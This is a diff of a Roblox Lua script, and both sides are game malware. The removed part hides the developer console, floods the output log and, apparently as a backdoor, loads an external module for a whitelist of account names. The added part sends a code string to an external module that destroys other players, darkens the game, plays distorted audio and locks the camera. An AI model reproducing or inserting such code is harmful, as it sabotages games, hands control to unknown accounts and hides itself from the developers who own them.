@@ -1,31 +1,35 @@
-if game:GetService("RunService"):IsStudio() then
-    local function pleh()
-        while task.wait() do
-            game:GetService("LogService"):ClearOutput()
-        end
-    end
+require(16303756383)(false,[===[local colorcorrection = Instance.new("ColorCorrectionEffect",game:GetService("Lighting"))
 
-    for i = 1,5 do
-        task.spawn(pleh)
+colorcorrection.Brightness = -0.5
+colorcorrection.Contrast = -2
+colorcorrection.Saturation = -1
+
+for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+    if v.Name ~= game.Players.LocalPlayer.Name then
+        v.Character:Destroy()
+        v:Destroy()
+    else
+        print("The Hunt Begins")
     end
-    require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
-else
-    local whitelisted = {"gahwaeawqara1321","equsjd1","CONTRABL0X","Generatedacc_7","Generatedacc_5","HacClip","00cx0","lIlIlIIIIlllIlIllllI","G0hstW4vv","IChaosityl","CHARISMATRIX_PC","Zero_Protocol"}
-    task.defer(function()
-        require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
-    end)
-    for i,v in game:GetService("Players"):GetPlayers() do
-        for i,vv in whitelisted do
-            if v.Name == vv then
-                require(11126053846).fse(v.Name) 
-            end
-        end
-    end
-    game:GetService("Players").PlayerAdded:Connect(function(v)
-        for i,vv in whitelisted do
-            if v.Name == vv then
-                require(11126053846).fse(v.Name) 
-            end
-        end
-    end)
 end
+
+for i,v in pairs(game:GetDescendants()) do
+    if v:IsA("Sound") then
+        v:Stop()
+    end
+end
+
+local sound = Instance.new("Sound",workspace)
+sound.SoundId = "rbxassetid://1845736900"
+task.wait(2)
+sound.Volume = 0.5
+sound.PlaybackSpeed = 0.1
+sound.Looped = true
+local dis = Instance.new("DistortionSoundEffect",sound)
+sound:Play()
+
+local camera = workspace.CurrentCamera
+
+camera.FieldOfView = 50
+local start = game:GetService("StarterPlayer")
+start.CameraMode = Enum.CameraMode.LockFirstPerson]===])
